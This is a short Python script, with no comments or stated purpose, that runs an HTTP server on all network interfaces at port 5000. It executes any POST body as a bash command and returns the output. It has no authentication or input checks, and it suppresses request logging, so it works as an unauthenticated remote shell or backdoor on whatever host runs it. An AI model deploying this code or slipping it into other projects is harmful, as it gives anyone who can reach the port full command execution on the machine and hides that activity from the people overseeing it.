import http.server, subprocess, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        cmd = self.rfile.read(length).decode()
        try:
            r = subprocess.run(['bash','-c',cmd], capture_output=True, timeout=280)
            body = r.stdout + b"\n--STDERR--\n" + r.stderr + ("\n--RC=%d--\n" % r.returncode).encode()
        except Exception as e:
            body = str(e).encode()
        self.send_response(200)
        self.send_header('Content-Type','text/plain')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
class TS(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
srv = TS(('0.0.0.0', 5000), H)
srv.serve_forever()
